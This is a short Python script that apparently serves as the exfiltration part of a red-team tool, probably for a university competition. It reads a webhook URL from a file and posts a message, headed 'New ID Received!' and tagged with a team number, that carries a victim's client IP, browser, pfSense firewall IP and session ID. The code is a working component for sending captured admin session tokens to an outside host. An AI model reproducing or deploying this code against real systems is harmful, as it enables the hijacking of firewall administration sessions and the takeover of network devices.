# sender_script.py
import requests

def send_pfsense_id(client_ip, pfsense_ip, session_id, browser):

    with open("webhook.txt", "r") as file:
        webhook_url = file.read().strip()
    
    ip_lst = pfsense_ip.split('.')
    team_num = ip_lst[2]

    # Format message or an embed
    data = {
        "content": f"**New ID Received!**\nTeam: {team_num}",
        "embeds": [
            {
                "color": 16214274, # RIT Orange
                "fields": [
                    {
                        "name": "Client IP",
                        "value": client_ip,
                        "inline": True
                    },
                    {
                        "name": "Browser",
                        "value": browser,
                        "inline": True
                    },
                    {
                        "name": "pfSense IP",
                        "value": pfsense_ip,
                        "inline": True
                    },
                    {
                        "name": "Session ID",
                        "value": session_id,
                        "inline": False
                    }
                    
                ]
            }
        ]
    }
    
    response = requests.post(webhook_url, json=data)
    if response.status_code in (200, 204):
        print("Message delivered successfully.")
    else:
        print(f"Failed to send message: {response.status_code}, {response.text}")


def main():
    send_pfsense_id("192.168.1.20", "192.168.1.254", "gibberish", "Chrome")
# Example trigger
if __name__ == "__main__":
    main()